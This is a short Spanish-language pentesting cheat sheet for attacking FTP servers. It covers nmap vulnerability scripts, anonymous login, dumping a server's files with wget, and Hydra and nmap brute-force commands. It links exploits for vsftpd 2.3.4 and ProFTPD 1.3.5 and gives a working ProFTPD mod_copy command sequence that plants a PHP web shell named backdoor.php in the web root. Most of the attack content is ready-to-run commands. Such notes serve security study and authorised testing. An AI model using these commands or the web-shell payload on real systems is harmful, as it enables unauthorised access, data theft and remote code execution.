# FTP
Protocolo de transferencia de archivos , usualmente en el puerto 21

## Enumeración
### NMAP scan
```
nmap IP --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 
```
### Conexión anonima
```
ftp Anonymous@IP
```
### Volcar el FTP si login anonymous esta activo
```bash
wget ftp://IP/* -r
```
### Interación con el servicio
* Obtener la ruta del directorio actual
```
>PWD
```
* Checkear si hay permisión de subir archivos 
```
>PUT file.ext
```
*  Obtener archivos desde el cliente
```
get file.ext
```

## Ataque por fuerza bruta
* Hydra
```
hydra -L UserList -P PassList ftp://IP 
```
* Nmap
```
nmap --script ftp-brute --script-args userdb=UserList -p Puerto IP
```

## Vulnerabilidades comunes sin metasploit
### ProFTPD 1.3.5 File Copy ( CVE 2015-3306 )
```
https://www.exploit-db.com/exploits/36742
```
#### Convertir la anterior vuln en un RCE
```
site cpfr /proc/self/cmdline
site cpto /tmp/.<?php passthru($_GET['cmd']);?>
site cpfr /tmp/.<?php passthru($_GET['cmd']);?>
site cpto /var/www/html/backdoor.php
```
### vsftpd 2.3.4 Backdoor ( CVE 2011-0762 ) 
```
https://github.com/ahervias77/vsftpd-2.3.4-exploit
```
